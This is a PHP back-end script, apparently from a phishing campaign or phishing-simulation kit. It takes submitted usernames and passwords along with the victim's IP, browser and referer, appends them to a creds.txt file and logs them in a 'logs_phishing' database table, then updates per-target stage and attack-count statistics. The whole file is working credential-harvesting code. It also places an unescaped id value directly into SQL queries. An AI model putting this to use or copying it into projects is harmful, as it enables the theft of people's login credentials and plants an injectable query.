<?php

include ("/home/user-data/www/default/admin/cc/bd.php");
mysqli_set_charset($link, "utf8");
$login = mysqli_real_escape_string($link, $_POST['username']);
$password = mysqli_real_escape_string($link, $_POST['password']);
$id = mysqli_real_escape_string($link, $_POST['id']);
$ip = $_SERVER['REMOTE_ADDR'];
  
 $user_agent = mysqli_real_escape_string($link,$_SERVER["HTTP_USER_AGENT"]);
  if (strpos($user_agent, "Firefox") !== false) $browser = "Firefox";
  elseif (strpos($user_agent, "Opera") !== false) $browser = "Opera";
  elseif (strpos($user_agent, "Chrome") !== false) $browser = "Chrome";
  elseif (strpos($user_agent, "MSIE") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Trident") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Safari") !== false) $browser = "Safari";
  else $browser = "Неизвестный";


$referer = mysqli_real_escape_string($link, $_SERVER['HTTP_REFERER']);


    $f=fopen("report/creds.txt","a");
    fwrite($f,date("\n j.m.Y в H:i")." \t $ip \t $id \t $login \t $password \t $user_agent \t $referer ");
    fclose($f);

    $result = mysqli_query ($link, "INSERT INTO logs_phishing (id,login,password,ip,user_agent, referer) VALUES('$id','$login','$password','$ip','$browser','$referer')");

/* Если id,login,password не пустые, то запиши в базу (в раздел Для отчета) */
      if(!empty($id) && !empty($login) && !empty($password)){
        $result = mysqli_query($link,"SELECT * FROM logs_common WHERE id =$id AND attack = '#attack_name' ");
        if( mysqli_num_rows($result) > 0) {
            mysqli_query($link,"UPDATE logs_common SET second_stage = '+' WHERE id = $id AND attack = '#attack_name' ");
        }
        else
        {
            mysqli_query($link,"INSERT INTO logs_common (id,login,attack,first_stage, second_stage) VALUES ('$id','$login','#attack_name','-', '+')");
      }
      
      $result1 = mysqli_query ($link, "SELECT * FROM attacks_stats");
      while ($row = mysqli_fetch_array($result1, MYSQLI_NUM)){
        $count = $row[1];
        $new_count = $count + 1;
      $result2 = mysqli_query ($link, "UPDATE attacks_stats SET count = '$new_count' WHERE attack_name = '#attack_name'");     
      }
    }

?>
